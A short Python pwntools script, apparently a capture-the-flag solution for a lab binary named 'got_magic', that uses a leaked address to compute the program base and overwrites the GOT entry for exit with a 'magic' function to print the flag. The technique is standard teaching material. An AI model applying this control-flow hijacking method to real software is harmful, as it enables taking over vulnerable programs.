from pwn import *
host = 'aup.zoolab.org'
port = 38153
#r = remote(host, port)
p = process('./got_magic')
got_exit = 0x201040
magic = 0x8bf 
main = 0x8dc 

p.readline()
line = p.readline().decode().split()
base = int(line[3], 16) - main
got_exit += base
magic += base
p.recvuntil('Where do you want to write?')
p.sendline(str(got_exit))
p.recvuntil('What do you want to write?')
p.sendline(str(magic))
flag = p.recvuntil('}')
print(flag)
